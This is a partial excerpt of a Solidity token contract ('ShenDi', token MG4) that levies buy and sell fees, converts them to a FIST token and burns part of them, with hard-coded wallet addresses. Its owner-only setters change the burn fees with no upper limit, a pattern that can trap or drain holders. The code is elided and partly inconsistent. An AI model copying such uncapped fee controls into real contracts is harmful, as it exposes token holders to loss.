...
uint256 public _buyDestroyed = 100;
uint256 public _sellDestroyed = 100;
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee + _buyDestroyed + _sellDestroyed;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee + _sellDestroyed;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee + _buyDestroyed;
            }
...
uint256 destroyedAmount = fistBalance * (_buyDestroyed + _sellDestroyed) * 2 / swapFee;
        FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
		FIST.transferFrom(address(_tokenDistributor), address(0), destroyedAmount);
...
function setbuyDestroyedFee(uint256 destroyedFee) external onlyOwner {
        _buyDestroyed= destroyedFee;
}
function setsellDestroyedFee(uint256 destroyedFee) external onlyOwner {
        _sellDestroyed= destroyedFee;
    }
...
contract ShenDi is AbsToken {
    constructor() AbsToken(
        ...
        address(0x1B6C9c20693afDE803B27F8782156c0f892ABC2d),//路由应该是
    
        address(0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A),//FIST合约
        "MG4",
        "MG4",
        6,
        ...
        address(0xD5d4178d7765F6B922DcCE29F56D850487a577fB),//回流钱包
    
        address(0x4d48B751A980CB6B83F001DCACF8F6F53Dbeb3b4)//管理员钱包
    ){
